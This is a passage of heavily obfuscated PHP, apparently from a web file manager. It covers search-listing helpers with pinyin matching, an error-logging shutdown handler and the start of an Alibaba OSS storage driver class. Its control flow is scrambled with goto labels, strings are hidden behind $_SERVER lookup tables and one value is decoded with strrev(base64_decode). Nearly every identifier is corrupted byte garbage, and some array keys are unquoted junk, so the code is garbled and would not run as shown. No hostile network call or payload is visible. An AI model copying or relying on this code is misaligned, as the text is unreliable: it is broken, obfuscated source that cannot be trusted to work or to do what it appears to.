$E‚àâÉøÄ¢); $Cò¾‚ë­´¥ = $fŒô¿¢Àãª[2278]; } $A«©á£³äö = explode($fŒô¿¢Àãª[57], trim($b—åßè§ø¦, $fŒô¿¢Àãª[57])); return array($Cò¾‚ë­´¥, $A«©á£³äö); goto D¦›ó‡ÕíÇ; F…´Õí’õ§: $fŒô¿¢Àãª =& $_SERVER[¨¤¼…´]; $C˜ò–“ÆâÔ = KodIO::fileTypeList(); $B˜åóù²Å = $C˜ò–“ÆâÔ[$bä»„õÔ]; goto Fƒ™ñ½ôÀ; D¦›ó‡ÕíÇ: } public function listPathType($a–¬à¦ƒŒª) { $A»šéÃê—‰ =& $_SERVER[¨¤¼…´]; $b´áœ”›Ã = $this->fileTypeWhere($a–¬à¦ƒŒª); if (!$b´áœ”›Ã) { return array(); } $DôÉÛÙò† = array($A»šéÃê—‰[534] => SourceModel::TYPE_USER, $A»šéÃê—‰[535] => USER_ID, $A»šéÃê—‰[531] => 0, $A»šéÃê—‰[532] => $b´áœ”›Ã); return $this->listSource($DôÉÛÙò†); } public function listSearch($c†à’ÂÁ, $aç‘“¶Ø¥¡ = 300) { goto a×À±ä…; EÜ¿ĞßÇò: $this->_listDataApply($FÆ²šôÁÕ„[$dì©çÛÃÇ[367]]); $this->_listMake($FÆ²šôÁÕ„); return $FÆ²šôÁÕ„; goto FÚ›Œ…À£; A…µÄÕÖ—: $this->_listSearchBindPinyin($c†à’ÂÁ, $FåÀß¶¸©Å, $eƒ‰¼·‹); $this->alias($dì©çÛÃÇ[500])->_makeOrder(); $FÆ²šôÁÕ„ = $this->distinct(!0)->field($eƒ‰¼·‹)->where($FåÀß¶¸©Å)->selectPage($aç‘“¶Ø¥¡); goto bÛƒé­âšï; a×À±ä…: $dì©çÛÃÇ =& $_SERVER[¨¤¼…´]; if (isset($c†à’ÂÁ[$dì©çÛÃÇ[2176]]) && $c†à’ÂÁ[$dì©çÛÃÇ[2176]]) { $c†à’ÂÁ[$dì©çÛÃÇ[2176]] = str_replace($dì©çÛÃÇ[1579], $dì©çÛÃÇ[2331], trim($c†à’ÂÁ[$dì©çÛÃÇ[2176]])); } $FåÀß¶¸©Å = $this->_parseSearchWhere($c†à’ÂÁ); goto då’šÍˆè™; då’šÍˆè™: if (!isset($FåÀß¶¸©Å[$dì©çÛÃÇ[409]])) { $FåÀß¶¸©Å[$dì©çÛÃÇ[409]] = 0; } $eƒ‰¼·‹ = $dì©çÛÃÇ[2332]; $DÉùŠÚò÷Ÿ = $eƒ‰¼·‹; goto A…µÄÕÖ—; bÛƒé­âšï: $this->_listSearchDesc($FÆ²šôÁÕ„, $c†à’ÂÁ, $DÉùŠÚò÷Ÿ); $this->_listSearchTag($FÆ²šôÁÕ„, $c†à’ÂÁ, $DÉùŠÚò÷Ÿ); $this->_listSearchGroupTag($FÆ²šôÁÕ„, $c†à’ÂÁ, $DÉùŠÚò÷Ÿ); goto EÜ¿ĞßÇò; FÚ›Œ…À£: } private function _listSearchTag(&$BÛ×Ï´¦âø, $CÙÖ½š‰, $A™ğÂ¯‹ˆ“) { goto DÊÓ‘—§³µ; Dİ©ÜÙÕ›Õ: $B¿öÑÓğ™¨ = array_to_keyvalue($B¿öÑÓğ™¨, $fëõîö—ë±[43], $fëõîö—ë±[85]); $F®óÛØà»Å = array_unique($B¿öÑÓğ™¨); $this->_listSearchMerge($BÛ×Ï´¦âø, $CÙÖ½š‰, $A™ğÂ¯‹ˆ“, $F®óÛØà»Å); goto C©çÜ·–æÆ; b†×ŞµÃ‘â: $D¦¦´Ã Ø¿ = array(); $CØØÉ­š«› = $CÙÖ½š‰[$fëõîö—ë±[2176]]; foreach ($fì·¼‹¥‚¾ as $CÕãÄâğÅ–) { $fñ¸™³å‚Ê = $CÕãÄâğÅ–[$fëõîö—ë±[38]]; $a¤îèÊöéä = str_replace($fëõîö—ë±[60], $fëõîö—ë±[43], Pinyin::encode($fñ¸™³å‚Ê)); if (stripos($fñ¸™³å‚Ê, $CØØÉ­š«›) !== !1 || stripos($a¤îèÊöéä, $CØØÉ­š«›) !== !1) { $D¦¦´Ã Ø¿[] = $CÕãÄâğÅ–[$fëõîö—ë±[379]]; } } goto bÍ¾“µÃóé; bÍ¾“µÃóé: if (!$D¦¦´Ã Ø¿) { return; } $Fóæ÷‹•¬Ñ = array($fëõîö—ë±[405] => array($fëõîö—ë±[7], $D¦¦´Ã Ø¿), $fëõîö—ë±[1425] => USER_ID); $B¿öÑÓğ™¨ = Model($fëõîö—ë±[406])->field($fëõîö—ë±[85])->where($Fóæ÷‹•¬Ñ)->select(); goto Dİ©ÜÙÕ›Õ; DÊÓ‘—§³µ: $fëõîö—ë± =& $_SERVER[¨¤¼…´]; if (!$CÙÖ½š‰[$fëõîö—ë±[2176]] || $BÛ×Ï´¦âø[$fëõîö—ë±[364]][$fëõîö—ë±[353]] > 1) { return; } $fì·¼‹¥‚¾ = Model($fëõîö—ë±[2333])->listData(); goto b†×ŞµÃ‘â; C©çÜ·–æÆ: } private function _listSearchDesc(&$dÖ¦ì‡–Á, $B´Å¥£Ú°•, $Céí—îã’ô) { goto Dù¬»óÇ†Ş; aƒÍê°êÀÊ: $fğÃ“‡Ù— = Model($B‰Ü¤ãˆƒÊ[517])->field($B‰Ü¤ãˆƒÊ[381])->where($A¹Ë°Ş†¼)->select(); $a§Ó¢ø¡’ = array_to_keyvalue($fğÃ“‡Ù—, $B‰Ü¤ãˆƒÊ[43], $B‰Ü¤ãˆƒÊ[381]); $this->_listSearchMerge($dÖ¦ì‡–Á, $B´Å¥£Ú°•, $Céí—îã’ô, $a§Ó¢ø¡’); goto BğõèŠùÚÃ; Dù¬»óÇ†Ş: $B‰Ü¤ãˆƒÊ =& $_SERVER[¨¤¼…´]; if (!$B´Å¥£Ú°•[$B‰Ü¤ãˆƒÊ[2176]] || $dÖ¦ì‡–Á[$B‰Ü¤ãˆƒÊ[364]][$B‰Ü¤ãˆƒÊ[353]] > 1) { return; } $bó¡ƒÄÃ´’ = $this->listSearchChildren($B´Å¥£Ú°•[$B‰Ü¤ãˆƒÊ[474]]); goto Dœ­ƒé­Ä“; Dœ­ƒé­Ä“: $bó¡ƒÄÃ´’ = array_unique($bó¡ƒÄÃ´’); if (!$bó¡ƒÄÃ´’) { return; } $A¹Ë°Ş†¼ = array($B‰Ü¤ãˆƒÊ[381] => array($B‰Ü¤ãˆƒÊ[7], $bó¡ƒÄÃ´’), $B‰Ü¤ãˆƒÊ[99] => $B‰Ü¤ãˆƒÊ[417], $B‰Ü¤ãˆƒÊ[372] => array($B‰Ü¤ãˆƒÊ[741], $B‰Ü¤ãˆƒÊ[2178] . $B´Å¥£Ú°•[$B‰Ü¤ãˆƒÊ[2176]] . $B‰Ü¤ãˆƒÊ[2178])); goto aƒÍê°êÀÊ; BğõèŠùÚÃ: } private function _listSearchGroupTag(&$aõÊ·£ÓÕƒ, $FŒè££µÜ, $A÷ë‡íßî–) { goto aÁ”ï¦¯Ì; C¸º¿Îå: $Dá·ŞÃ˜¿  = array_to_keyvalue($Dá·ŞÃ˜¿ , $eÅ»Á–¦[43], $eÅ»Á–¦[85]); $BëÛ­œÛÆ = array_unique($Dá·ŞÃ˜¿ ); $this->_listSearchMerge($aõÊ·£ÓÕƒ, $FŒè££µÜ, $A÷ë‡íßî–, $BëÛ­œÛÆ); goto aàİŠâÂ¶; eæÜœ«óÎî: if (!$eÖì½œå¼¢) { return; } $b¿‚ê¥¼£À = array($eÅ»Á–¦[405] => array($eÅ»Á–¦[7], $eÖì½œå¼¢), $eÅ»Á–¦[1425] => 0, $eÅ»Á–¦[39] => $eÅ»Á–¦[2196] . $A‹Ù™Ò”ãê); $Dá·ŞÃ˜¿  = Model($eÅ»Á–¦[406])->field($eÅ»Á–¦[85])->where($b¿‚ê¥¼£À)->select(); goto C¸º¿Îå; aÁ”ï¦¯Ì: $eÅ»Á–¦ =& $_SERVER[¨¤¼…´]; if (!$FŒè££µÜ[$eÅ»Á–¦[2176]] || $aõÊ·£ÓÕƒ[$eÅ»Á–¦[364]][$eÅ»Á–¦[353]] > 1 || !$FŒè££µÜ[$eÅ»Á–¦[474]]) { return; } $CñğÑÜÃ¹ê = $this->sourceInfo($FŒè££µÜ[$eÅ»Á–¦[474]]); goto Bë›¹³‚µ; B¿²íœÌø: $eÖì½œå¼¢ = array(); $a‘îã“™Ó = $FŒè££µÜ[$eÅ»Á–¦[2176]]; foreach ($f…‹¥Æ»›Å[$eÅ»Á–¦[367]] as $C‚¼¾Ñ¶ß) { $eô®‚Ä­‚ƒ = $C‚¼¾Ñ¶ß[$eÅ»Á–¦[38]]; $aİñòéõ = str_replace($eÅ»Á–¦[60], $eÅ»Á–¦[43], Pinyin::encode($eô®‚Ä­‚ƒ)); if (stripos($eô®‚Ä­‚ƒ, $a‘îã“™Ó) !== !1 || stripos($aİñòéõ, $a‘îã“™Ó) !== !1) { $eÖì½œå¼¢[] = $C‚¼¾Ñ¶ß[$eÅ»Á–¦[379]]; } } goto eæÜœ«óÎî; Bë›¹³‚µ: if (!$CñğÑÜÃ¹ê || $CñğÑÜÃ¹ê[$eÅ»Á–¦[383]] != SourceModel::TYPE_GROUP) { return; } $A‹Ù™Ò”ãê = $CñğÑÜÃ¹ê[$eÅ»Á–¦[469]]; $f…‹¥Æ»›Å = Model($eÅ»Á–¦[2334])->get($A‹Ù™Ò”ãê); goto B¿²íœÌø; aàİŠâÂ¶: } private function _listSearchMerge(&$E««ÜğôÓ, $AÍè±ø¢ŸÙ, $EâŞ‰íï¸Ï, $Bô¯š°ÌÓ) { goto EŠ‡ò«“Ã; EãÛŠğÃñ½: foreach ($FóÔ³ÄŞ as $c½Úˆƒ¢§) { $Eğ¤Ğ¼¡Î’ = $dõ±Àù´šœ[57] . $AÍè±ø¢ŸÙ[$dõ±Àù´šœ[474]] . $dõ±Àù´šœ[57]; if (stripos($c½Úˆƒ¢§[$dõ±Àù´šœ[472]], $Eğ¤Ğ¼¡Î’) !== !1) { $DÊŞò‡­Ğæ[] = $c½Úˆƒ¢§; } } $E««ÜğôÓ[$dõ±Àù´šœ[367]] = array_merge($DÊŞò‡­Ğæ, $E««ÜğôÓ[$dõ±Àù´šœ[367]]); $E««ÜğôÓ[$dõ±Àù´šœ[364]][$dõ±Àù´šœ[365]] += count($DÊŞò‡­Ğæ); goto C¢§¶‘Ü¾; Eµ’‘ç­³ğ: $dŒáêÓŸÓÁ = array_diff($Bô¯š°ÌÓ, $a…©Ç¹ªÎé); if (!$dŒáêÓŸÓÁ) { return; } $cÖƒíñ = array($dõ±Àù´šœ[381] => array($dõ±Àù´šœ[7], $dŒáêÓŸÓÁ)); goto D¬Ğ Åğí; D¬Ğ Åğí: $FóÔ³ÄŞ = $this->field($EâŞ‰íï¸Ï)->where($cÖƒíñ)->select(); if (!$FóÔ³ÄŞ) { return; } $DÊŞò‡­Ğæ = array(); goto EãÛŠğÃñ½; EŠ‡ò«“Ã: $dõ±Àù´šœ =& $_SERVER[¨¤¼…´]; if (!$Bô¯š°ÌÓ) { return; } $a…©Ç¹ªÎé = array_to_keyvalue($E««ÜğôÓ[$dõ±Àù´šœ[367]], $dõ±Àù´šœ[43], $dõ±Àù´šœ[381]); goto Eµ’‘ç­³ğ; C¢§¶‘Ü¾: } public function listSearchChildren($EİÄÎó¸, $døÌãÁëÈÈ = 5000) { goto FÛò°İ“ê; c â³ŞªÒÔ: $E£„—ÖÙî = $this->field($bšÅÅ Œ‘Ú[381])->where($e³ò‰Àª›¢)->select(); $A¯ï ƒ‡»Û = array_to_keyvalue($E£„—ÖÙî, $bšÅÅ Œ‘Ú[43], $bšÅÅ Œ‘Ú[381]); return $A¯ï ƒ‡»Û; goto e‹ß§ª’Íô; b‡àè´£È¬: $e³ò‰Àª›¢ = array($bšÅÅ Œ‘Ú[472] => array($bšÅÅ Œ‘Ú[741], $C™ÉÄ’Üõ[$bšÅÅ Œ‘Ú[472]] . $C™ÉÄ’Üõ[$bšÅÅ Œ‘Ú[381]] . $bšÅÅ Œ‘Ú[497])); $E¨åãë®œŞ = $this->field($bšÅÅ Œ‘Ú[381])->cache(null, 600)->where($e³ò‰Àª›¢)->count(); if ($E¨åãë®œŞ > $døÌãÁëÈÈ) { return $this->_listSearchChildrenNear($EİÄÎó¸, $døÌãÁëÈÈ); } goto c â³ŞªÒÔ; FÛò°İ“ê: $bšÅÅ Œ‘Ú =& $_SERVER[¨¤¼…´]; $A¯ï ƒ‡»Û = array(); $C™ÉÄ’Üõ = $this->sourceInfo($EİÄÎó¸); goto b‡àè´£È¬; e‹ß§ª’Íô: } private function _listSearchChildrenNear($bÖÌì²ï“á, $F‚Ş¹ÕÄæ) { goto EŠØæ³õìÀ; EŠØæ³õìÀ: $CÍİÍ•ºª =& $_SERVER[¨¤¼…´]; $Bˆ³òñ×øÙ = array(); $fØœ¡‚ÄÏ‚ = array($CÍİÍ•ºª[474] => $bÖÌì²ï“á); goto aÈ½ËæÊ†è; A¾òµÔŸè: $Bˆ³òñ×øÙ = array_merge($Bˆ³òñ×øÙ, array_to_keyvalue($B›Î†ÑÕ”…, $CÍİÍ•ºª[43], $CÍİÍ•ºª[381])); $Bˆ³òñ×øÙ = array_slice($Bˆ³òñ×øÙ, 0, $F‚Ş¹ÕÄæ); return $Bˆ³òñ×øÙ; goto f’…Ïò ; f›ˆ›«Ù: if (!$a·­ƒî„Ì) { return $Bˆ³òñ×øÙ; } $fØœ¡‚ÄÏ‚ = array($CÍİÍ•ºª[474] => array($CÍİÍ•ºª[7], $a·­ƒî„Ì)); $B›Î†ÑÕ”… = $this->field($CÍİÍ•ºª[2335])->where($fØœ¡‚ÄÏ‚)->select(); goto A¾òµÔŸè; aÈ½ËæÊ†è: $B›Î†ÑÕ”… = $this->field($CÍİÍ•ºª[2335])->where($fØœ¡‚ÄÏ‚)->select(); $a·­ƒî„Ì = array_to_keyvalue(array_filter_by_field($B›Î†ÑÕ”…, $CÍİÍ•ºª[382], $CÍİÍ•ºª[93]), $CÍİÍ•ºª[43], $CÍİÍ•ºª[381]); $Bˆ³òñ×øÙ = array_merge($Bˆ³òñ×øÙ, array_to_keyvalue($B›Î†ÑÕ”…, $CÍİÍ•ºª[43], $CÍİÍ•ºª[381])); goto f›ˆ›«Ù; f’…Ïò : } private function _listSearchBindPinyin($D³Ø·Ó´ÇÛ, &$c‹—îì², &$B£¿© ÏÇ) { goto fßÎÊèè®ˆ; e«áêèÊ÷¯: $eñø¦ˆÆ÷ø[] = array($B±Õ—‰‹‡[2339] => $E¯Ù›¯¤Üö, $B±Õ—‰‹‡[900] => $B±Õ—‰‹‡[2180], array($B±Õ—‰‹‡[2340] => $E¯Ù›¯¤Üö, $B±Õ—‰‹‡[2341] => array($B±Õ—‰‹‡[7], array($B±Õ—‰‹‡[428], $B±Õ—‰‹‡[427])))); $this->join($CÄŸé®¥šŠ); $c‹—îì² = $eñø¦ˆÆ÷ø; goto a†‚ƒ Ğìù; bâñ±Ûáî¡: unset($c‹—îì²[$B±Õ—‰‹‡[38]]); foreach ($c‹—îì² as $eŞÜæ¢©Æ¤ => $eÙ±Æ§ã»ã) { $eñø¦ˆÆ÷ø[$B±Õ—‰‹‡[2337] . $eŞÜæ¢©Æ¤] = $eÙ±Æ§ã»ã; } $E¯Ù›¯¤Üö = array($B±Õ—‰‹‡[496], $B±Õ—‰‹‡[2178] . $D³Ø·Ó´ÇÛ[$B±Õ—‰‹‡[2176]] . $B±Õ—‰‹‡[2178]); goto e«áêèÊ÷¯; fßÎÊèè®ˆ: $B±Õ—‰‹‡ =& $_SERVER[¨¤¼…´]; if (!Input::check($D³Ø·Ó´ÇÛ[$B±Õ—‰‹‡[2176]], $B±Õ—‰‹‡[319]) || strlen($D³Ø·Ó´ÇÛ[$B±Õ—‰‹‡[2176]]) < 2) { return; } $CÄŸé®¥šŠ = "\114\x45\x46\124\x20\112\117\111\116\40{$this->tablePrefix}\x69\157\137\163\x6f\165\x72\143\145\137\155\x65\x74\x61\x20\155\145\x74\x61\40\x6f\156\40\x73\x6f\x75\x72\143\x65\56\x73\x6f\165\162\143\x65\x49\x44\x20\x3d\40\x6d\145\164\x61\x2e\x73\157\x75\x72\x63\x65\x49\104"; goto D‰Ú¥†©’µ; D‰Ú¥†©’µ: $eñø¦ˆÆ÷ø = array(); $B£¿© ÏÇ = str_replace(array($B±Õ—‰‹‡[14], $B±Õ—‰‹‡[60], $B±Õ—‰‹‡[2336]), $B±Õ—‰‹‡[43], $B£¿© ÏÇ); $B£¿© ÏÇ = $B±Õ—‰‹‡[2337] . str_replace($B±Õ—‰‹‡[57], $B±Õ—‰‹‡[2338], $B£¿© ÏÇ); goto bâñ±Ûáî¡; a†‚ƒ Ğìù: } private function _parseSearchWhere($aç¶¬öÙ´) { goto EƒöÏÁº; EƒöÏÁº: $F³…³†æ• =& $_SERVER[¨¤¼…´]; $f®£¡†—ÈÚ = array(); if (isset($aç¶¬öÙ´[$F³…³†æ•[692]])) { $f®£¡†—ÈÚ[$F³…³†æ•[117]] = array($F³…³†æ•[2342], $aç¶¬öÙ´[$F³…³†æ•[692]]); } goto eÒíêÃ‰ù; eÒíêÃ‰ù: if (isset($aç¶¬öÙ´[$F³…³†æ•[460]])) { $b¾ÆÑ Å“è = array($F³…³†æ•[2343], $aç¶¬öÙ´[$F³…³†æ•[460]]); if ($f®£¡†—ÈÚ[$F³…³†æ•[117]]) { $f®£¡†—ÈÚ[$F³…³†æ•[117]] = array($f®£¡†—ÈÚ[$F³…³†æ•[117]], $b¾ÆÑ Å“è, $F³…³†æ•[2344]); } else { $f®£¡†—ÈÚ[$F³…³†æ•[117]] = $b¾ÆÑ Å“è; } } if (isset($aç¶¬öÙ´[$F³…³†æ•[2345]])) { $f®£¡†—ÈÚ[$F³…³†æ•[87]] = array($F³…³†æ•[2342], $aç¶¬öÙ´[$F³…³†æ•[2345]]); } if (isset($aç¶¬öÙ´[$F³…³†æ•[2346]])) { $b¾ÆÑ Å“è = array($F³…³†æ•[2343], $aç¶¬öÙ´[$F³…³†æ•[2346]]); if ($f®£¡†—ÈÚ[$F³…³†æ•[87]]) { $f®£¡†—ÈÚ[$F³…³†æ•[87]] = array($f®£¡†—ÈÚ[$F³…³†æ•[87]], $b¾ÆÑ Å“è, $F³…³†æ•[2344]); } else { $f®£¡†—ÈÚ[$F³…³†æ•[87]] = $b¾ÆÑ Å“è; } } goto f¤•©ïÅøÄ; cË´Ş¡éˆ: if (isset($aç¶¬öÙ´[$F³…³†æ•[2176]]) && $aç¶¬öÙ´[$F³…³†æ•[2176]]) { $E—Ğ„óÒ«Ñ = $aç¶¬öÙ´[$F³…³†æ•[2176]]; $f“é‰âÙˆ = explode($F³…³†æ•[60], $E—Ğ„óÒ«Ñ); if (strlen($E—Ğ„óÒ«Ñ) > 2 && (substr($E—Ğ„óÒ«Ñ, 0, 1) == $F³…³†æ•[123] && substr($E—Ğ„óÒ«Ñ, -1) == $F³…³†æ•[123]) || substr($E—Ğ„óÒ«Ñ, 0, 1) == $F³…³†æ•[65] && substr($E—Ğ„óÒ«Ñ, -1) == $F³…³†æ•[65]) { $E—Ğ„óÒ«Ñ = substr($E—Ğ„óÒ«Ñ, 1, -1); $f“é‰âÙˆ = array($E—Ğ„óÒ«Ñ); } $f®£¡†—ÈÚ[$F³…³†æ•[38]] = array($F³…³†æ•[496], $F³…³†æ•[2178] . $E—Ğ„óÒ«Ñ . $F³…³†æ•[2178]); if (count($f“é‰âÙˆ) > 1) { $f®£¡†—ÈÚ[$F³…³†æ•[38]] = array(); foreach ($f“é‰âÙˆ as $c¯«œ±™½) { if (!trim($c¯«œ±™½)) { continue; } $f®£¡†—ÈÚ[$F³…³†æ•[38]][] = array($F³…³†æ•[496], $F³…³†æ•[2178] . trim($c¯«œ±™½) . $F³…³†æ•[2178]); } } } return $f®£¡†—ÈÚ; goto FËğˆÙöë; f¤•©ïÅøÄ: if (isset($aç¶¬öÙ´[$F³…³†æ•[547]])) { $f®£¡†—ÈÚ[] = array($F³…³†æ•[391] => $aç¶¬öÙ´[$F³…³†æ•[547]], $F³…³†æ•[390] => $aç¶¬öÙ´[$F³…³†æ•[547]], $F³…³†æ•[900] => $F³…³†æ•[2180]); } if (isset($aç¶¬öÙ´[$F³…³†æ•[384]])) { $aİ‚òÔ¿¿ = $aç¶¬öÙ´[$F³…³†æ•[384]]; if ($aİ‚òÔ¿¿ == $F³…³†æ•[86]) { $f®£¡†—ÈÚ[$F³…³†æ•[382]] = 1; } else { if ($aİ‚òÔ¿¿ == $F³…³†æ•[2347]) { $f®£¡†—ÈÚ[$F³…³†æ•[382]] = 0; } else { if ($aİ‚òÔ¿¿) { $aİ‚òÔ¿¿ = is_array($aİ‚òÔ¿¿) ? $aİ‚òÔ¿¿ : explode($F³…³†æ•[57], $aİ‚òÔ¿¿); $f®£¡†—ÈÚ[$F³…³†æ•[384]] = array($F³…³†æ•[396], $aİ‚òÔ¿¿); $f®£¡†—ÈÚ[$F³…³†æ•[382]] = 0; } } } } if (isset($aç¶¬öÙ´[$F³…³†æ•[474]])) { $aœƒĞá¯ÂÊ = $this->sourceInfo($aç¶¬öÙ´[$F³…³†æ•[474]]); $f®£¡†—ÈÚ[$F³…³†æ•[538]] = array($F³…³†æ•[496], $aœƒĞá¯ÂÊ[$F³…³†æ•[472]] . $aç¶¬öÙ´[$F³…³†æ•[474]] . $F³…³†æ•[497]); } goto cË´Ş¡éˆ; FËğˆÙöë: } } goto aò§²åŞÙí; CÈÃÌ‚°”Ô: function beforeShutdownError($C˜Ï´½¶Ó = false, $cõé†ìó¹ = '', $AÑß¬Æ®ó = '', $Bğèœ™›À = 0) { $B†´ê˜‘¿ö =& $_SERVER[ë‹ºñÌ†‡]; switch ($C˜Ï´½¶Ó) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $e÷ìˆÅ‰¼ = $B†´ê˜‘¿ö[35]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $e÷ìˆÅ‰¼ = $B†´ê˜‘¿ö[36]; break; case E_STRICT: $e÷ìˆÅ‰¼ = $B†´ê˜‘¿ö[37]; break; case E_NOTICE: case E_USER_NOTICE: $e÷ìˆÅ‰¼ = $B†´ê˜‘¿ö[38]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $e÷ìˆÅ‰¼ = $B†´ê˜‘¿ö[39]; break; default: break; } if (!$e÷ìˆÅ‰¼ || $e÷ìˆÅ‰¼ == $B†´ê˜‘¿ö[38] || $e÷ìˆÅ‰¼ == $B†´ê˜‘¿ö[39]) { return; } $AÑß¬Æ®ó = $B†´ê˜‘¿ö[4] . str_replace($_SERVER[$B†´ê˜‘¿ö[33]], $B†´ê˜‘¿ö[16], $AÑß¬Æ®ó); $eª—ó¿Óì = $e÷ìˆÅ‰¼ . $B†´ê˜‘¿ö[40] . $cõé†ìó¹ . $B†´ê˜‘¿ö[40] . $AÑß¬Æ®ó . $B†´ê˜‘¿ö[40] . $Bğèœ™›À; write_log($eª—ó¿Óì . $B†´ê˜‘¿ö[41] . get_caller_msg(1), $B†´ê˜‘¿ö[15]); } $_SERVER[$_SERVER[ë‹ºñÌ†‡][42]] = $_SERVER[$_SERVER[ë‹ºñÌ†‡][33]] . $_SERVER[ë‹ºñÌ†‡][43]; $eˆ‚â¹™„Æ = strrev(base64_decode($_SERVER[ë‹ºñÌ†‡][44])); goto B™Ä¡÷íÄ; a¤øìÇ‘…: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($fóâ¶¥”ŒŸ) { parent::__construct(); include_once SDK_DIR . $_SERVER[¨¤¼…´][1160]; $this->_init($fóâ¶¥”ŒŸ); } public function _init($Eæì‰†ªÊä) { $D¼àŞí¯Å¿ =& $_SERVER[¨¤¼…´]; foreach ($Eæì‰†ªÊä as $B¯ŠÆùç­ => $fˆï«‡®­¨) { if (isset($this->{$B¯ŠÆùç­})) { $this->{$B¯ŠÆùç­} = $fˆï«‡®­¨; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($D¼àŞí¯Å¿[1161] . LNG($D¼àŞí¯Å¿[1162])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto dé¾†¦®˜‘; dé¾†¦®˜‘: $f§í´ğµ’§ =& $_SERVER[¨¤¼…´]; $Có÷É˜Ìºá = new OSS\Model\CorsConfig(); $AçÖÌù­Üº = new OSS\Model\CorsRule(); goto E•¡·¼öÌª; a¶ƒ¸Ç…¤²: $AçÖÌù­Üº->setMaxAgeSeconds(600); $AçÖÌù­Üº->addExposeHeader($f§í´ğµ’§[1168]); $AçÖÌù­Üº->addAllowedHeader($f§í´ğµ’§[1163]); goto F»Êòƒ¥; E•¡·¼öÌª: $AçÖÌù­Üº->addAllowedOrigin($f§í´ğµ’§[1163]); $AçÖÌù­Üº->addAllowedMethod($f§í´ğµ’§[1164]); $AçÖÌù­Üº->addAllowedMethod($f§í´ğµ’§[1165]); goto EßôŠğˆ; EßôŠğˆ: $AçÖÌù­Üº->addAllowedMethod($f§í´ğµ’§[1166]); $AçÖÌù­Üº->addAllowedMethod($f§í´ğµ’§[1167]); $AçÖÌù­Üº->addAllowedMethod($f§í´ğµ’§[165]); goto a¶ƒ¸Ç…¤²; F»Êòƒ¥: $Có÷É˜Ìºá->addRule($AçÖÌù­Üº); try { $this->client->putBucketCors($this->bucket, $Có÷É˜Ìºá); } catch (OSS\Core\OssException $F¶ÂîŸŠİÜ) { return !1; } return !0; goto eç„ …Ìæ; eç„ …Ìæ: } public function getBucketCors() { goto bèá˜…¹Ä; bèá˜…¹Ä: $BŠëƒƒß„ =& $_SERVER[¨¤¼…´]; $BÄ«–ßçÇ‡ = null; try { $BÄ«–ßçÇ‡ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Fºé‰ÄŠ‚Ï) { return null; } goto Eµ¡ª¿ÔÏõ; Eµ¡ª¿ÔÏõ: if (!$BÄ«–ßçÇ‡ || !($F‰ÀÓ…ğ×î = $BÄ«–ßçÇ‡->getRules())) { return null; } $c‘ŸƒÊ¹ì” = $F‰ÀÓ…ğ×î[0]->getAllowedOrigins(); $aÈŒ™ÈÀêâ = $F‰ÀÓ…ğ×î[0]->getAllowedMethods(); goto D³¶¸°¼Ã; D³¶¸°¼Ã: $A¾ˆîĞö»† = $F‰ÀÓ…ğ×î[0]->getMaxAgeSeconds(); $DŒ§“Úöˆ = $F‰ÀÓ…ğ×î[0]->getExposeHeaders(); $Bù¬÷ÔŒèÏ = $F‰ÀÓ…ğ×î[0]->getAllowedHeaders(); goto aº’ Ï§Œò; aº’ Ï§Œò: return array($BŠëƒƒß„[189] => isset($c‘ŸƒÊ¹ì”[0]) ? $c‘ŸƒÊ¹ì”[0] : $BŠëƒƒß„[43], $BŠëƒƒß„[193] => $aÈŒ™ÈÀêâ, $BŠëƒƒß„[1169] => $A¾ˆîĞö»†, $BŠëƒƒß„[1170] => isset($DŒ§“Úöˆ[0]) ? $DŒ§“Úöˆ[0] : $BŠëƒƒß„[43], $BŠëƒƒß„[191] => isset($Bù¬÷ÔŒèÏ[0]) ? $Bù¬÷ÔŒèÏ[0] : $BŠëƒƒß„[43]); goto B…ÌğĞŒ; B…ÌğĞŒ: } public function isBucketCors() { goto Fåù¥ãç™; FˆéÄÂ: $dëÉ‚¡óÎÃ = array($f¬ğëÛÎ–Ú[194], $f¬ğëÛÎ–Ú[195], $f¬ğëÛÎ–Ú[196], $f¬ğëÛÎ–Ú[197], $f¬ğëÛÎ–Ú[198]); $fÔ÷­›…‚õ = array_diff($dëÉ‚¡óÎÃ, $e›Ï‚÷í–¸); return empty($fÔ÷­›…‚õ); goto F›İªŸœ‚; Fåù¥ãç™: $f¬ğëÛÎ–Ú =& $_SERVER[¨¤¼…´]; $EÒ®ñí•ñ = $this->getBucketCors(); if (!$EÒ®ñí•ñ || !is_array($EÒ®ñí•ñ)) { return !1; } goto dâ—¸ñÍ—³; dâ—¸ñÍ—³: if ($EÒ®ñí•ñ[$f¬ğëÛÎ–Ú[189]] != $f¬ğëÛÎ–Ú[190] || $EÒ®ñí•ñ[$f¬ğëÛÎ–Ú[191]] != $f¬ğëÛÎ–Ú[190]) { return !1; } $e›Ï‚÷í–¸ = array_map($f¬ğëÛÎ–Ú[192], $EÒ®ñí•ñ[$f¬ğëÛÎ–Ú[193]]); if (!is_array($e›Ï‚÷í–¸)) { $e›Ï‚÷í–¸ = array(); } goto FˆéÄÂ; F›İªŸœ‚: } public function mkfile($FÛÑÏ—ãõõ, $C¨«Ñ®‚ä¥ = '', $FÏàùÃÃË = REPEAT_RENAME) { $C°÷ˆĞÜ”İ = $this->setContent($FÛÑÏ—ãõõ, $C¨«Ñ®‚ä¥); if ($C°÷ˆĞÜ”İ !== !1) { return $this->getPathOuter($FÛÑÏ—ãõõ); } return !1; } public function mkdir($C‰Øä¯ £, $c•Ü£Ãç¡ß = REPEAT_SKIP) { if ($this->_isFolder($C‰Øä¯ £)) { return $this->getPathOuter($C‰Øä¯ £); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($C‰Øä¯ £)); } catch (OSS\Core\OssException $d‡®Å‡ò) { return !1; } return $this->getPathOuter($C‰Øä¯ £); } private function fileList($dĞ‰„Ÿ˜Ç, $fŒùÑ¡ò = '', $E”ç«ŠŸ‡ = 0) { goto EÌİÀ™´åÔ; 